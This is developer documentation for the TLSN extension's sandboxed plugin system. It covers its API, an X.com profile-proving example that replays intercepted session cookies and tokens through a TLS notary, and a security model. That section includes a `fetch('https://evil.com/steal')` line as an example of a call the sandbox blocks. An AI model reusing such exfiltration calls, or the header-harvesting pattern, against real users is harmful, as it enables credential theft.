# TLSN Extension Plugin System

This document describes the architecture, capabilities, and development guide for TLSN Extension plugins.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Plugin Lifecycle](#plugin-lifecycle)
4. [Available Capabilities](#available-capabilities)
5. [Example: X-Profile Plugin](#example-x-profile-plugin)
6. [Security Model](#security-model)
7. [Development Guide](#development-guide)

---

## Overview

The TLSN Extension features a **secure plugin system** that allows developers to create JavaScript plugins for generating TLS proofs. Plugins run in an isolated **QuickJS WebAssembly sandbox** with controlled access to extension features through a **capability-based security model**.

### Key Features

- ✅ **Sandboxed Execution** - Plugins run in isolated QuickJS WASM environment
- ✅ **Capability-Based Security** - Fine-grained control over plugin permissions
- ✅ **Multi-Window Support** - Open and manage up to 10 browser windows
- ✅ **Request Interception** - Capture HTTP requests and headers in real-time
- ✅ **TLS Proof Generation** - Direct access to TLSN prover functionality
- ✅ **React-like Hooks** - Familiar patterns with `useEffect`, `useRequests`, `useHeaders`
- ✅ **Type-Safe** - Full TypeScript support with declaration files

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     Browser Extension                        │
│                                                              │
│  ┌────────────────┐         ┌──────────────────┐           │
│  │   Background   │◄────────┤ Content Script   │           │
│  │ Service Worker │         │  (Per Tab)       │           │
│  └────────┬───────┘         └──────────────────┘           │
│           │                                                  │
│           │ Manages                                          │
│           ▼                                                  │
│  ┌────────────────────┐                                     │
│  │  WindowManager     │  - Track up to 10 windows          │
│  │                    │  - Intercept HTTP requests          │
│  │                    │  - Store request/header history     │
│  └────────────────────┘                                     │
│           │                                                  │
│           │ Forwards to                                      │
│           ▼                                                  │
│  ┌────────────────────────────────────────────────┐        │
│  │         Offscreen Document                      │        │
│  │                                                  │        │
│  │  ┌──────────────────┐      ┌─────────────────┐│        │
│  │  │ SessionManager   │◄────►│  ProveManager   ││        │
│  │  │                  │      │  (WASM Worker)  ││        │
│  │  │  - Plugin State  │      │                 ││        │
│  │  │  - UI Rendering  │      │  - TLS Prover   ││        │
│  │  │  - Capabilities  │      │  - Transcripts  ││        │
│  │  └────────┬─────────┘      └─────────────────┘│        │
│  │           │                                      │        │
│  │           │ Creates & Manages                    │        │
│  │           ▼                                      │        │
│  │  ┌─────────────────────────────────┐           │        │
│  │  │    Host (QuickJS Sandbox)       │           │        │
│  │  │                                  │           │        │
│  │  │  ┌────────────────────────────┐ │           │        │
│  │  │  │   Plugin Code (Isolated)   │ │           │        │
│  │  │  │                            │ │           │        │
│  │  │  │  - main() → UI rendering  │ │           │        │
│  │  │  │  - callbacks → User actions│ │           │        │
│  │  │  │                            │ │           │        │
│  │  │  │  Access via env object:   │ │           │        │
│  │  │  │  - env.openWindow()       │ │           │        │
│  │  │  │  - env.useRequests()      │ │           │        │
│  │  │  │  - env.createProver()     │ │           │        │
│  │  │  │  - env.div(), env.button()│ │           │        │
│  │  │  └────────────────────────────┘ │           │        │
│  │  │                                  │           │        │
│  │  │  Security: No network, no FS    │           │        │
│  │  └─────────────────────────────────┘           │        │
│  └──────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────┘
```

---

## Architecture

### Core Components

#### 1. **Host** (`packages/plugin-sdk/src/index.ts`)

The `Host` class is the core runtime for executing plugins. It:

- Creates isolated QuickJS WebAssembly sandboxes
- Registers capabilities (functions) that plugins can access via `env` object
- Provides two execution modes:
  - `run(code)` - Single execution with automatic cleanup
  - `createEvalCode()` - Persistent sandbox for multiple evaluations
- Handles error propagation from sandbox to host

**Key Configuration:**

```typescript
const sandboxOptions = {
  allowFetch: false,    // Network disabled for security
  allowFs: false,       // File system disabled
  env: {                // Capabilities injected here
    openWindow: (url) => { /* ... */ },
    createProver: (dns, verifierUrl) => { /* ... */ },
    // ... all other capabilities
  },
};
```

#### 2. **SessionManager** (`packages/extension/src/offscreen/SessionManager.ts`)

Manages plugin lifecycle and provides all capabilities. Responsibilities:

- **Session State Management** - Track active plugin sessions with UUIDs
- **Capability Registration** - Inject all plugin APIs into sandbox
- **UI Rendering** - Execute `main()` to generate plugin UI as JSON
- **Context Management** - Track hook dependencies and selectors
- **Callback Handling** - Execute user-triggered callbacks (button clicks)
- **Window Association** - Link sessions to managed browser windows

**Session State Structure:**

```typescript
type SessionState = {
  id: string;                              // UUID
  pluginUrl: string;                       // Origin of plugin
  plugin: string;                          // Plugin code
  requests?: InterceptedRequest[];         // Captured HTTP requests
  headers?: InterceptedRequestHeader[];    // Captured request headers
  windowId?: number;                       // Associated Chrome window ID
  context: {                               // Hook dependency tracking
    [functionName: string]: {
      effects: any[][];                    // useEffect dependencies
      selectors: any[][];                  // useRequests/useHeaders results
    };
  };
  currentContext: string;                  // Current execution context
  sandbox: {                               // QuickJS runtime
    eval: (code: string) => Promise<unknown>;
    dispose: () => void;
  };
  main: () => any;                         // Main UI render function
  callbacks: {                             // User-triggered callbacks
    [callbackName: string]: () => Promise<void>;
  };
};
```

#### 3. **ProveManager** (`packages/extension/src/offscreen/ProveManager/`)

Manages TLS proof generation using TLSN WebAssembly. Features:

- **Worker-Based Execution** - Runs WASM in Web Worker for non-blocking performance
- **Prover Lifecycle** - Create, configure, and manage multiple provers
- **Request Proxying** - Send HTTP requests through TLS prover
- **Transcript Access** - Get sent/received data from TLS session
- **Selective Reveal** - Control which parts of transcript are revealed to verifier

#### 4. **WindowManager** (`packages/extension/src/background/WindowManager.ts`)

Manages multiple browser windows and request interception. Features:

- **Window Registration** - Track up to 10 concurrent managed windows
- **Request Interception** - Capture all HTTP requests via `webRequest` API
- **Header Interception** - Capture all request headers
- **History Management** - Store up to 1000 requests/headers per window
- **Overlay Control** - Show/hide TLSN overlay with retry logic
- **Automatic Cleanup** - Remove invalid windows periodically

**Managed Window Structure:**

```typescript
interface ManagedWindow {
  id: number;                           // Chrome window ID
  uuid: string;                         // Internal UUID
  tabId: number;                        // Primary tab ID
  url: string;                          // Current/initial URL
  createdAt: Date;                      // Creation timestamp
  requests: InterceptedRequest[];       // Max 1000 requests
  headers: InterceptedRequestHeader[];  // Max 1000 headers
  overlayVisible: boolean;              // Overlay state
  pluginUIVisible: boolean;             // Plugin UI state
  showOverlayWhenReady: boolean;        // Delayed overlay flag
}
```

---

## Plugin Lifecycle

### 1. Plugin Execution

```
┌───────────────────────────────────────────────────────────┐
│  1. User Triggers Plugin Execution                        │
│     (e.g., from Developer Console)                        │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  2. Background Service Worker                             │
│     - Receives EXEC_CODE message                          │
│     - Forwards to Offscreen Document                      │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  3. SessionManager.executePlugin(code)                    │
│     - Creates QuickJS sandbox with capabilities           │
│     - Evaluates plugin code                               │
│     - Extracts { main, prove, config, ...callbacks }      │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  4. Initial Render: main()                                │
│     - Plugin returns UI as JSON (div/button tree)         │
│     - May call openWindow() via useEffect                 │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  5. Request/Header Interception                           │
│     - WindowManager captures HTTP traffic                 │
│     - Sends REQUEST_INTERCEPTED messages                  │
│     - SessionManager updates session state                │
│     - Calls main() again → UI updates                     │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  6. User Interaction (Button Click)                       │
│     - Content script sends PLUGIN_UI_CLICK message        │
│     - SessionManager executes associated callback         │
│     - Callback may call prove(), createProver(), etc.     │
│     - Calls main() again → UI updates                     │
└────────────────────┬──────────────────────────────────────┘
                     │
                     ▼
┌───────────────────────────────────────────────────────────┐
│  7. Plugin Completion: done()                             │
│     - Closes associated window                            │
│     - Disposes QuickJS sandbox                            │
│     - Resolves executePlugin() promise                    │
└───────────────────────────────────────────────────────────┘
```

### 2. Message Flow

**Plugin → Extension:**

```typescript
// Plugin code (in sandbox)
const windowInfo = await openWindow('https://x.com');
// → Sends: { type: 'OPEN_WINDOW', url, ... }
// ← Receives: { type: 'WINDOW_OPENED', payload: { windowId, uuid, tabId } }

await createProver('api.x.com', 'https://notary.pse.dev');
// → Creates prover in ProveManager
// ← Returns proverId (UUID)
```

**Extension → Plugin:**

```typescript
// Background captures request
windowManager.addRequest(windowId, request);
// → Sends: { type: 'REQUEST_INTERCEPTED', windowId, request }

// SessionManager receives message
sessionManager.updateRequestsForSession(sessionId, request);
// → Updates session.requests
// → Calls session.main() to re-render UI
// → Sends: { type: 'RENDER_PLUGIN_UI', json, windowId }
```

---

## Available Capabilities

All capabilities are accessible via the `env` object in plugin code. The `env` object is automatically injected into the QuickJS sandbox by the Host.

### DOM Construction

Create UI elements as JSON. These are rendered by the content script.

#### `div(options, children)`

Create a div element.

**Parameters:**
- `options` - Object with `style`, `onclick`, and other HTML attributes
- `children` - Array of child elements or strings

**Returns:** JSON representation of div element

**Example:**

```javascript
div(
  {
    style: {
      backgroundColor: '#1a1a1a',
      padding: '16px',
      borderRadius: '8px',
    },
  },
  [
    'Hello World',
    button({ onclick: 'handleClick' }, ['Click Me']),
  ]
)
```

#### `button(options, children)`

Create a button element.

**Parameters:**
- `options` - Object with `style`, `onclick`, and other HTML attributes
  - `onclick` - String name of callback function to execute
- `children` - Array of child elements or strings

**Returns:** JSON representation of button element

**Example:**

```javascript
button(
  {
    style: {
      backgroundColor: '#4CAF50',
      color: 'white',
      padding: '10px 20px',
      border: 'none',
      borderRadius: '4px',
      cursor: 'pointer',
    },
    onclick: 'startProof', // Name of exported callback
  },
  ['Generate Proof']
)
```

---

### Window Management

#### `openWindow(url, options?)`

Open a new managed browser window with request interception enabled.

**Parameters:**
- `url` - String URL to open
- `options` - Optional object:
  - `width` - Window width in pixels (default: 800)
  - `height` - Window height in pixels (default: 600)
  - `showOverlay` - Boolean, show TLSN overlay (default: false)

**Returns:** Promise<{ windowId: number, uuid: string, tabId: number }>

**Limits:**
- Maximum 10 concurrent managed windows
- Throws error if limit exceeded

**Example:**

```javascript
// Open X.com with overlay
const windowInfo = await openWindow('https://x.com', {
  width: 900,
  height: 700,
  showOverlay: true,
});

console.log('Window opened:', windowInfo.windowId);
```

#### `closeWindow(windowId)`

Close a managed browser window.

**Parameters:**
- `windowId` - Number, Chrome window ID from `openWindow()`

**Returns:** Promise<void>

**Example:**

```javascript
await closeWindow(windowInfo.windowId);
```

---

### React-like Hooks

#### `useEffect(effect, deps)`

Run side effects with dependency tracking (similar to React's useEffect).

**Parameters:**
- `effect` - Function to execute
- `deps` - Array of dependencies (effect runs when dependencies change)

**Behavior:**
- On first render: Always executes
- On subsequent renders: Executes only if dependencies changed
- Dependencies compared using deep equality

**Example:**

```javascript
function main() {
  const [requests] = useRequests((reqs) => reqs);

  // Open window on first render only
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // Log when requests change
  useEffect(() => {
    console.log('Requests updated:', requests.length);
  }, [requests]);

  return div({}, ['Hello World']);
}
```

#### `useRequests(filterFn)`

Get filtered intercepted HTTP requests for the current window.

**Parameters:**
- `filterFn` - Function that filters/transforms request array
  - Receives: `InterceptedRequest[]`
  - Returns: Filtered/transformed array

**Returns:** Array with result of filterFn

**InterceptedRequest Structure:**

```typescript
interface InterceptedRequest {
  requestId: string;     // Chrome request ID
  url: string;           // Full request URL
  method: string;        // HTTP method (GET, POST, etc.)
  frameId: number;       // Frame ID
  parentFrameId: number; // Parent frame ID
  tabId: number;         // Tab ID
  type: string;          // Resource type (xmlhttprequest, script, etc.)
  timeStamp: number;     // Unix timestamp
}
```

**Example:**

```javascript
// Get all API requests to x.com
const [apiRequests] = useRequests((requests) =>
  requests.filter((req) =>
    req.url.includes('api.x.com') &&
    req.method === 'GET'
  )
);

// Check if specific endpoint was called
const [profileRequest] = useRequests((requests) =>
  requests.filter((req) =>
    req.url.includes('/account/settings.json')
  )
);
```

#### `useHeaders(filterFn)`

Get filtered intercepted HTTP request headers for the current window.

**Parameters:**
- `filterFn` - Function that filters/transforms header array
  - Receives: `InterceptedRequestHeader[]`
  - Returns: Filtered/transformed array

**Returns:** Array with result of filterFn

**InterceptedRequestHeader Structure:**

```typescript
interface InterceptedRequestHeader {
  requestId: string;     // Chrome request ID
  url: string;           // Full request URL
  method: string;        // HTTP method
  frameId: number;       // Frame ID
  parentFrameId: number; // Parent frame ID
  tabId: number;         // Tab ID
  type: string;          // Resource type
  timeStamp: number;     // Unix timestamp
  requestHeaders: Array<{
    name: string;        // Header name (e.g., 'Cookie')
    value?: string;      // Header value
  }>;
}
```

**Example:**

```javascript
// Find request with authentication headers
const [authHeader] = useHeaders((headers) =>
  headers.filter((header) =>
    header.url.includes('api.x.com/1.1/account/settings.json')
  )
);

// Extract specific headers
if (authHeader) {
  const cookie = authHeader.requestHeaders.find(h => h.name === 'Cookie')?.value;
  const csrfToken = authHeader.requestHeaders.find(h => h.name === 'x-csrf-token')?.value;
}
```

---

### TLS Proof Operations

#### `createProver(serverDns, verifierUrl, maxRecvData?, maxSentData?)`

Initialize a new TLS prover instance.

**Parameters:**
- `serverDns` - String, server domain (e.g., 'api.x.com')
- `verifierUrl` - String, verifier WebSocket URL (e.g., 'https://notary.pse.dev')
- `maxRecvData` - Optional number, max received bytes (default: 16384)
- `maxSentData` - Optional number, max sent bytes (default: 4096)

**Returns:** Promise<string> - Prover ID (UUID)

**Example:**

```javascript
const proverId = await createProver(
  'api.x.com',
  'https://notary.pse.dev',
  32768,  // 32 KB max receive
  8192    // 8 KB max send
);
```

#### `sendRequest(proverId, proxyUrl, options)`

Send an HTTP request through the TLS prover.

**Parameters:**
- `proverId` - String, prover ID from `createProver()`
- `proxyUrl` - String, WebSocket proxy URL (e.g., 'wss://notary.pse.dev/proxy?token=api.x.com')
- `options` - Object:
  - `url` - String, full request URL
  - `method` - Optional string, HTTP method (default: 'GET')
  - `headers` - Optional object, request headers
  - `body` - Optional string, request body

**Returns:** Promise<void>

**Example:**

```javascript
await sendRequest(
  proverId,
  'wss://notary.pse.dev/proxy?token=api.x.com',
  {
    url: 'https://api.x.com/1.1/account/settings.json',
    method: 'GET',
    headers: {
      'Cookie': cookieValue,
      'authorization': authToken,
      'x-csrf-token': csrfToken,
      'Host': 'api.x.com',
      'Accept-Encoding': 'identity',
      'Connection': 'close',
    },
  }
);
```

#### `transcript(proverId)`

Get the TLS transcript (sent and received data) from a prover.

**Parameters:**
- `proverId` - String, prover ID

**Returns:** Promise<{ sent: Uint8Array, recv: Uint8Array }>

**Example:**

```javascript
const { sent, recv } = await transcript(proverId);

console.log('Sent bytes:', sent.length);
console.log('Received bytes:', recv.length);

// Convert to string
const sentStr = Buffer.from(sent).toString('utf-8');
const recvStr = Buffer.from(recv).toString('utf-8');
```

#### `reveal(proverId, commit)`

Reveal selective parts of the transcript to the verifier.

**Parameters:**
- `proverId` - String, prover ID
- `commit` - Object specifying what to reveal:
  - `sent` - Array of ranges to reveal from sent data
  - `recv` - Array of ranges to reveal from received data
  - Range format: `{ start: number, end: number }`

**Returns:** Promise<void>

**Example:**

```javascript
// Reveal all received data, but redact sensitive headers in sent data
const commit = {
  sent: subtractRanges(
    { start: 0, end: sent.length },  // Full range
    [                                  // Subtract these ranges
      { start: 100, end: 200 },       // Cookie location
      { start: 250, end: 300 },       // Auth token location
    ]
  ),
  recv: [{ start: 0, end: recv.length }], // Reveal all
};

await reveal(proverId, commit);
```

---

### Utility Functions

#### `subtractRanges(range, excludeRanges)`

Subtract multiple ranges from a main range.

**Parameters:**
- `range` - Object: `{ start: number, end: number }`
- `excludeRanges` - Array of ranges to subtract

**Returns:** Array of remaining ranges

**Example:**

```javascript
// Main range: 0-100
// Exclude: 20-30 and 50-60
// Result: [0-20, 30-50, 60-100]

const result = subtractRanges(
  { start: 0, end: 100 },
  [
    { start: 20, end: 30 },
    { start: 50, end: 60 },
  ]
);
// result = [{ start: 0, end: 20 }, { start: 30, end: 50 }, { start: 60, end: 100 }]
```

#### `mapStringToRange(strings, text)`

Map array of strings to their byte ranges in text.

**Parameters:**
- `strings` - Array of strings to find
- `text` - String to search in

**Returns:** Array of ranges where strings were found

**Example:**

```javascript
const text = 'Cookie: abc123\nAuthorization: Bearer xyz789';
const sensitiveStrings = [
  'Cookie: abc123',
  'Authorization: Bearer xyz789',
];

const ranges = mapStringToRange(sensitiveStrings, text);
// ranges = [{ start: 0, end: 14 }, { start: 15, end: 45 }]

// Use with subtractRanges to redact sensitive data
const redacted = subtractRanges(
  { start: 0, end: text.length },
  ranges
);
```

#### `done(args?)`

Complete plugin execution and cleanup.

**Parameters:**
- `args` - Optional data to return to caller

**Effects:**
- Closes associated browser window
- Disposes QuickJS sandbox
- Resolves `executePlugin()` promise

**Example:**

```javascript
async function prove() {
  // ... generate proof ...

  // Finish and close window
  await done({ success: true, proofId: 'abc123' });
}
```

---

## Example: X-Profile Plugin

This example demonstrates a complete plugin that proves a user's X.com (Twitter) profile by:
1. Opening X.com and waiting for user to log in
2. Detecting the profile API request
3. Generating a TLS proof with selective reveal (redacting sensitive headers)

```javascript
// Plugin configuration - shown in UI
const config = {
  name: 'X Profile Prover',
  description: 'This plugin will prove your X.com profile.',
};

/**
 * Main UI rendering function
 * Called on initialization and whenever state changes (requests/headers update)
 *
 * @returns JSON representation of UI (div/button tree)
 */
function main() {
  // Hook: Get headers that match the profile endpoint
  // This filters all intercepted headers to find the specific API call we need
  const [header] = useHeaders((headers) =>
    headers.filter((header) =>
      // Look for X.com's account settings endpoint - this is called when logged in
      header.url.includes('https://api.x.com/1.1/account/settings.json'),
    ),
  );

  // Hook: Open X.com window on first render
  // The empty dependency array [] means this only runs once
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // Render plugin UI as a floating card in bottom-right corner
  return div(
    {
      style: {
        position: 'fixed',
        bottom: '0',
        right: '8px',
        width: '240px',
        height: '240px',
        borderRadius: '4px 4px 0 0',
        backgroundColor: '#b8b8b8',
        zIndex: '999999',
        fontSize: '16px',
        color: '#0f0f0f',
        border: '1px solid #e2e2e2',
        borderBottom: 'none',
        padding: '8px',
        fontFamily: 'sans-serif',
      },
    },
    [
      // Status indicator - changes color based on detection
      div(
        {
          style: {
            fontWeight: 'bold',
            // Green when profile detected, red when not
            color: header ? 'green' : 'red',
          },
        },
        [header ? 'Profile detected!' : 'No profile detected'],
      ),

      // Conditional rendering based on detection state
      header
        ? // If profile detected, show "Prove" button
          button(
            {
              style: {
                color: 'black',
                backgroundColor: 'white',
              },
              // When clicked, execute the 'prove' callback (exported below)
              onclick: 'prove',
            },
            ['Prove'],
          )
        : // If not detected, show instructions
          div(
            { style: { color: 'black' } },
            ['Please login to x.com']
          ),
    ],
  );
}

/**
 * Proof generation callback
 * Triggered when user clicks the "Prove" button
 *
 * This function:
 * 1. Extracts necessary headers from the intercepted request
 * 2. Creates a TLS prover connection
 * 3. Replays the request through the prover
 * 4. Generates a selective reveal (hides sensitive data)
 * 5. Sends proof to verifier
 */
async function prove() {
  // Get the same header we detected in main()
  const [header] = useHeaders((headers) =>
    headers.filter((header) =>
      header.url.includes('https://api.x.com/1.1/account/settings.json'),
    ),
  );

  // Extract all necessary headers from the intercepted request
  // These are needed to replay the authenticated request through the prover
  const headers = {
    // Cookie contains session authentication
    cookie: header.requestHeaders.find((h) => h.name === 'Cookie')?.value,

    // CSRF token for X.com's security
    'x-csrf-token': header.requestHeaders.find((h) => h.name === 'x-csrf-token')?.value,

    // Transaction ID for request tracking
    'x-client-transaction-id': header.requestHeaders.find(
      (h) => h.name === 'x-client-transaction-id'
    )?.value,

    // Standard headers
    Host: 'api.x.com',

    // OAuth token for API authentication
    authorization: header.requestHeaders.find((h) => h.name === 'authorization')?.value,

    // Disable compression so we can read the response
    'Accept-Encoding': 'identity',

    // Close connection after request (required for TLS proof)
    Connection: 'close',
  };

  // Step 1: Create a prover instance
  // This establishes a connection to the notary/verifier
  const proverId = await createProver(
    'api.x.com',                           // Server we're proving against
    'https://demo.tlsnotary.org'           // Notary service URL
  );

  // Step 2: Send the request through the prover
  // This performs the actual TLS connection and captures the transcript
  await sendRequest(
    proverId,
    // WebSocket proxy that forwards our request to the real server
    'wss://notary.pse.dev/proxy?token=api.x.com',
    {
      url: 'https://api.x.com/1.1/account/settings.json',
      method: 'GET',
      headers: headers,
    }
  );

  // Step 3: Get the transcript (sent and received data)
  const { sent, recv } = await transcript(proverId);

  // Step 4: Prepare selective reveal
  // We want to prove the request/response without revealing sensitive auth data

  // Convert sent data to string for range mapping
  const sentStr = Buffer.from(sent).toString('utf-8');

  // Find byte ranges of sensitive headers we want to redact
  const sensitiveRanges = mapStringToRange(
    [
      `x-csrf-token: ${headers['x-csrf-token']}`,
      `x-client-transaction-id: ${headers['x-client-transaction-id']}`,
      `cookie: ${headers['cookie']}`,
      `authorization: ${headers.authorization}`,
    ],
    sentStr
  );

  // Create commit: reveal everything EXCEPT the sensitive ranges
  const commit = {
    // For sent data: reveal all except sensitive headers
    sent: subtractRanges(
      { start: 0, end: sent.length },  // Full range
      sensitiveRanges                   // Subtract these ranges
    ),
    // For received data: reveal everything (profile info is public)
    recv: [{ start: 0, end: recv.length }],
  };

  // Step 5: Send the selective reveal to the verifier
  // This completes the proof generation
  await reveal(proverId, commit);

  // Note: After this, you could call done() to close the window
  // await done({ success: true });
}

// Export all functions and config
// The SessionManager looks for these exports to register callbacks
export default {
  main,    // Required: UI rendering function
  prove,   // Optional: callback triggered by button onclick="prove"
  config,  // Optional: plugin metadata
};
```

### Plugin Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Plugin Initialization                                    │
│    - SessionManager evaluates plugin code                   │
│    - Extracts main(), prove(), config                       │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. First Render: main()                                     │
│    - useHeaders([]) returns []                              │
│    - useEffect() triggers → openWindow('https://x.com')     │
│    - UI shows: "No profile detected" + "Please login"      │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. User Logs In to X.com                                    │
│    - Browser makes request to /account/settings.json        │
│    - WindowManager intercepts headers                       │
│    - Sends REQUEST_HEADER_INTERCEPTED message               │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Second Render: main() (triggered by new headers)        │
│    - useHeaders([...]) returns [headerWithApiCall]          │
│    - UI shows: "Profile detected!" + [Prove] button        │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. User Clicks "Prove" Button                              │
│    - Content script sends PLUGIN_UI_CLICK { callback: 'prove' } │
│    - SessionManager executes prove() callback               │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ 6. Proof Generation: prove()                                │
│    - Extract headers from intercepted request               │
│    - createProver('api.x.com', notaryUrl)                  │
│    - sendRequest(proverId, proxyUrl, { url, headers })     │
│    - transcript(proverId) → get sent/recv data              │
│    - Create selective reveal (redact sensitive headers)     │
│    - reveal(proverId, commit) → send to verifier           │
│    - done() → close window and cleanup                      │
└─────────────────────────────────────────────────────────────┘
```

---

## Security Model

### Sandbox Isolation

Plugins run in a **QuickJS WebAssembly sandbox** with strict limitations:

**Disabled Features:**
- ❌ Network access (`fetch`, `XMLHttpRequest`)
- ❌ File system access
- ❌ Browser APIs (except through capabilities)
- ❌ Node.js APIs
- ❌ `eval` / `Function` constructors (controlled by QuickJS)

**Allowed Features:**
- ✅ ES6+ JavaScript syntax
- ✅ Pure computation
- ✅ Capabilities registered by host (via `env` object)

### Capability-Based Security

Plugins only access extension features through **explicitly registered capabilities**:

```javascript
// In plugin code (sandbox)
// ✅ Allowed - registered capability
await openWindow('https://x.com');

// ❌ Blocked - no fetch capability
await fetch('https://evil.com/steal'); // TypeError: fetch is not defined

// ❌ Blocked - no file system
const fs = require('fs'); // ReferenceError: require is not defined
```

### Resource Limits

**Window Management:**
- Maximum 10 concurrent managed windows
- Error thrown if limit exceeded

**Request/Header History:**
- Maximum 1000 requests per window
- Maximum 1000 headers per window
- Oldest items removed when limit exceeded (FIFO)

**Prover Limits:**
- `maxSentData`: 4096 bytes (configurable)
- `maxRecvData`: 16384 bytes (configurable)
- Configurable per-prover via `createProver()`

### Error Isolation

Errors in plugin code don't crash the extension:

```javascript
// Plugin throws error
throw new Error('Something went wrong!');

// Host catches and reports
try {
  await sandbox.eval(pluginCode);
} catch (error) {
  console.error('Plugin error:', error.message);
  // Extension continues running
}
```

---

## Development Guide

### Plugin Structure

Every plugin must export an object with at least a `main` function:

```javascript
export default {
  main,              // Required: UI rendering function
  config: {          // Optional: plugin metadata
    name: 'My Plugin',
    description: 'Does something cool',
  },
  // Optional: callback functions (referenced by onclick)
  myCallback: async () => { /* ... */ },
  anotherCallback: async () => { /* ... */ },
};
```

### Development Workflow

1. **Write Plugin Code**
   - Create `.js` file with plugin logic
   - Use ES6+ syntax
   - Export `{ main, config, ...callbacks }`

2. **Test in Extension**
   - Load plugin via Developer Console
   - Or use test page: `npm run serve:test`

3. **Debug**
   - Check Chrome DevTools console for errors
   - Use `console.log()` in plugin code (captured by sandbox)
   - Inspect intercepted requests/headers in UI

4. **Iterate**
   - Modify plugin code
   - Reload in extension
   - Test again

### Best Practices

#### 1. Use Hooks for State Management

```javascript
function main() {
  // ✅ Good: Filter in hook, use result
  const [apiRequests] = useRequests((reqs) =>
    reqs.filter(r => r.url.includes('api.x.com'))
  );

  // ❌ Bad: Don't filter outside hooks
  // (won't trigger re-render when requests change)
}
```

#### 2. Handle Missing Data Gracefully

```javascript
function main() {
  const [header] = useHeaders(/* ... */);

  // ✅ Good: Check if header exists
  if (!header) {
    return div({}, ['Waiting for data...']);
  }

  // Access header.requestHeaders safely
  const cookie = header.requestHeaders.find(h => h.name === 'Cookie')?.value;
}
```

#### 3. Use useEffect for Side Effects

```javascript
function main() {
  // ✅ Good: Open window once on first render
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // ❌ Bad: Don't call directly in main
  // openWindow('https://x.com'); // Opens on EVERY render!
}
```

#### 4. Minimize Revealed Data

```javascript
async function prove() {
  const { sent, recv } = await transcript(proverId);

  // ✅ Good: Only reveal non-sensitive data
  const commit = {
    sent: subtractRanges(
      { start: 0, end: sent.length },
      sensitiveRanges
    ),
    recv: [{ start: 0, end: recv.length }],
  };

  // ❌ Bad: Revealing everything exposes secrets
  // const commit = {
  //   sent: [{ start: 0, end: sent.length }],
  //   recv: [{ start: 0, end: recv.length }],
  // };
}
```

#### 5. Clean Up Resources

```javascript
async function prove() {
  // ... generate proof ...

  // ✅ Good: Close window and cleanup when done
  await done({ success: true });

  // ❌ Bad: Leaving windows open wastes resources
}
```

### Common Patterns

#### Waiting for Specific Request

```javascript
function main() {
  const [targetRequest] = useRequests((reqs) =>
    reqs.filter(r => r.url.includes('/api/target'))
  );

  if (!targetRequest) {
    return div({}, ['Waiting for request...']);
  }

  return div({}, ['Request detected!']);
}
```

#### Multi-Step Proof

```javascript
let currentStep = 'init';

function main() {
  if (currentStep === 'init') {
    useEffect(() => {
      openWindow('https://example.com');
      currentStep = 'waiting';
    }, []);
    return div({}, ['Opening window...']);
  }

  if (currentStep === 'waiting') {
    const [data] = useRequests(/* ... */);
    if (data) {
      currentStep = 'ready';
    }
    return div({}, ['Waiting for data...']);
  }

  if (currentStep === 'ready') {
    return button({ onclick: 'prove' }, ['Generate Proof']);
  }
}
```

#### Error Handling

```javascript
async function prove() {
  try {
    const proverId = await createProver('api.x.com', notaryUrl);
    await sendRequest(proverId, proxyUrl, options);
    await reveal(proverId, commit);
    await done({ success: true });
  } catch (error) {
    console.error('Proof failed:', error);
    // Show error in UI by updating state and re-rendering
    // (implementation depends on your state management)
  }
}
```

---

## Troubleshooting

### Plugin Not Rendering

**Problem:** Plugin UI doesn't appear

**Solutions:**
- Ensure `main()` function is exported
- Check console for JavaScript errors
- Verify `main()` returns valid JSON structure (div/button tree)
- Check that window is managed (opened via `openWindow()` or has plugin session)

### Requests Not Detected

**Problem:** `useRequests()` or `useHeaders()` returns empty array

**Solutions:**
- Ensure window is managed (created via `openWindow()`)
- Check that URL matches filter function
- Verify requests are HTTP/HTTPS (not `chrome://`, `about:`, etc.)
- Check WindowManager limits (max 1000 requests per window)
- Wait for page to fully load and make requests

### Prover Fails

**Problem:** `createProver()` or `sendRequest()` throws error

**Solutions:**
- Verify notary/verifier URL is correct and reachable
- Check proxy URL format: `wss://host/proxy?token=domain`
- Ensure `maxSentData`/`maxRecvData` are sufficient for request/response
- Verify headers are correct (especially `Host`, `Connection: close`)
- Check that server supports TLS 1.2+ with compatible cipher suites

### Memory Issues

**Problem:** Extension slows down or crashes

**Solutions:**
- Call `done()` when plugin finishes to cleanup resources
- Close windows you don't need with `closeWindow()`
- Avoid creating too many provers simultaneously
- Be mindful of 10-window limit
- Check for infinite loops in plugin code

---

## API Reference Summary

### DOM Construction
- `div(options, children)` - Create div element
- `button(options, children)` - Create button element

### Window Management
- `openWindow(url, options?)` - Open managed window
- `closeWindow(windowId)` - Close window

### Hooks
- `useEffect(effect, deps)` - Side effect with dependencies
- `useRequests(filterFn)` - Get filtered requests
- `useHeaders(filterFn)` - Get filtered headers

### TLS Proof
- `createProver(serverDns, verifierUrl, maxRecv?, maxSent?)` - Initialize prover
- `sendRequest(proverId, proxyUrl, options)` - Send request through prover
- `transcript(proverId)` - Get transcript
- `reveal(proverId, commit)` - Selective reveal

### Utilities
- `subtractRanges(range, excludeRanges)` - Range subtraction
- `mapStringToRange(strings, text)` - Find string positions
